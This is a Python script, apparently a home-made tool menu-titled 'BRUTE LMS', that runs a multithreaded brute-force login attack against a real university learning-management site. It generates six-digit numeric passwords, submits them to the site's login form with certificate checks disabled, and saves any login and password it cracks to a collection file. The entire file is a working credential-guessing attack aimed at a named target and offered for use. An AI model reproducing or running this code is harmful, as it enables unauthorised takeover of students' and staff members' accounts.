import os
import time
import copy
import threading
import itertools
import requests
import urllib
import urllib3
import sys
import lxml.html

FLAG = False

def test_1(array, iteration, num_func, start_time):
	global FLAG
	for i in range(iteration, len(array)):
		print("Пароль - {} в функции №{} за время - {}".format(array[i].replace("\n", ''), num_func, time.time() - start_time))
		if (array[i].replace("\n", '') == "000123"):
			FLAG = True
		if (FLAG):
			break

def brute(array, iteration, login, num, thread_num):
	global FLAG
	url = "https://lms.uni-dubna.ru/login/"
	headers = {
	'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36',
	'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
	'Accept-Language':'ru-ru,ru;q=0.8,en-us;q=0.5,en;q=0.3',
	'Accept-Encoding':'gzip, deflate',
	'Connection':'keep-alive',
	}
	for i in range(iteration, len(array)):
		try:
			if (not FLAG):
				print("Try password", array[i].replace("\n", ''), "iteration", (i - iteration + num), "in thread", thread_num)
				password = array[i].replace("\n", '')
				session = requests.session()
				data = session.get(url, headers = headers, verify = False)
				page = lxml.html.fromstring(data.content)
				form = page.forms[0]
				form.fields["username"] = login
				form.fields["password"] = password
				response = session.post(form.action, data = form.form_values(), verify = False)
				if (thread_num == 10):
					os.system("cls")
				if ("Личный кабинет" in response.text):
					FLAG = True
					save_passwd_login(login, password)
					os.system("cls")
					print("FOUND!")
				# elif (FLAG):
				# 	sys.exit()
				else:
					pass
			else:
				sys.exit()
		except TimeoutError:
			os.system("cls")
			print("Time is out, waiting for 10 seconds...")
			time.sleep(10)
			i -=- 1
		except requests.exceptions.ConnectionError:
			os.system("cls")
			print("Connection error, waiting for 10 seconds...")
			time.sleep(10)
			i -=- 1

def main():
	login = input("Login: ")
	try:
		last_iteration = int(input("Last iteration: "))
	except:
		print("INPUT NUM")
		sys.exit()
	file = open("PASSWORDS.txt", 'r')
	array = file.readlines()
	file.close()
	passwd_list = copy.copy(array[last_iteration:len(array)])
	del array
	zero = threading.Thread(target = brute, kwargs={"array" : passwd_list, "iteration" : 0, "login" : login, "num" : last_iteration, "thread_num" : 1})
	one = threading.Thread(target = brute, kwargs={"array" : passwd_list, "iteration" : 100000, "login" : login, "num" : last_iteration, "thread_num" : 2})
	two = threading.Thread(target = brute, kwargs={"array" : passwd_list, "iteration" : 200000, "login" : login, "num" : last_iteration, "thread_num" : 3})
	three = threading.Thread(target = brute, kwargs={"array" : passwd_list, "iteration" : 300000, "login" : login, "num" : last_iteration, "thread_num" : 4})
	four = threading.Thread(target = brute, kwargs={"array" : passwd_list, "iteration" : 400000, "login" : login, "num" : last_iteration, "thread_num" : 5})
	five = threading.Thread(target = brute, kwargs={"array" : passwd_list, "iteration" : 500000, "login" : login, "num" : last_iteration, "thread_num" : 6})
	six = threading.Thread(target = brute, kwargs={"array" : passwd_list, "iteration" : 600000, "login" : login, "num" : last_iteration, "thread_num" : 7})
	seven = threading.Thread(target = brute, kwargs={"array" : passwd_list, "iteration" : 700000, "login" : login, "num" : last_iteration, "thread_num" : 8})
	eight = threading.Thread(target = brute, kwargs={"array" : passwd_list, "iteration" : 800000, "login" : login, "num" : last_iteration, "thread_num" : 9})
	nine = threading.Thread(target = brute, kwargs={"array" : passwd_list, "iteration" : 900000, "login" : login, "num" : last_iteration, "thread_num" : 10})
	# Et tu, Brute?
	zero.start()
	one.start()
	two.start()
	three.start()
	four.start()
	five.start()
	six.start()
	seven.start()
	eight.start()
	nine.start()
	
	zero.join()
	one.join()
	two.join()
	three.join()
	four.join()
	five.join()
	six.join()
	seven.join()
	eight.join()
	nine.join()

def write_file():
	file = open("PASSWORDS.txt", 'w')
	for i in itertools.product("0123456789", repeat = 6):
		if (len(set(str(''.join(i)))) >= 3):
			file.write(''.join(i) + "\n")
	file.close()

def read_file(i):
	file = open("PASSWORDS.txt", 'r')
	array = file.readlines()
	file.close()
	passwd_list = copy.copy(array[i:len(array)])
	del array
	return passwd_list

def save_passwd_login(login, password):
	file = open("LMS_COLLECTION.txt", 'a')
	file.write("login    : " + login + "\npassword : " + password + "\ndate     : " + time.strftime("%d.%m.%y %H:%M") + "\n-----------------\n")
	file.close()

if __name__ == '__main__':
	urllib3.disable_warnings()
	os.system("cls")
	print('''
 ______   _______          _________ _______        _        _______  _______   
(  ___ \ (  ____ )|\     /|\__   __/(  ____ \      ( \      (       )(  ____ \  
| (   ) )| (    )|| )   ( |   ) (   | (    \/      | (      | () () || (    \/  
| (__/ / | (____)|| |   | |   | |   | (__          | |      | || || || (_____   
|  __ (  |     __)| |   | |   | |   |  __)         | |      | |(_)| |(_____  )  
| (  \ \ | (\ (   | |   | |   | |   | (            | |      | |   | |      ) |  
| )___) )| ) \ \__| (___) |   | |   | (____/\      | (____/\| )   ( |/\____) |  
|/ \___/ |/   \__/(_______)   )_(   (_______/      (_______/|/     \|\_______)  
	''')
	commands = (main, write_file, sys.exit)
	while (True):
		print('''
				MENU
				
			1 - brute account
			2 - make list passwords
			3 - exit
		''')
		choice = int(input("Your choice >> ")) - 1
		if (choice >= len(commands)):
			os.system("cls")
			print("\t\t\t    !WRONG INPUT!")
			time.sleep(1)
		else:
			commands[choice]()
		del choice

# TimeoutError: [WinError 10060] A connection attempt failed because the connected party did not properly respond after a period of time, or established connection failed because connected host has failed to respond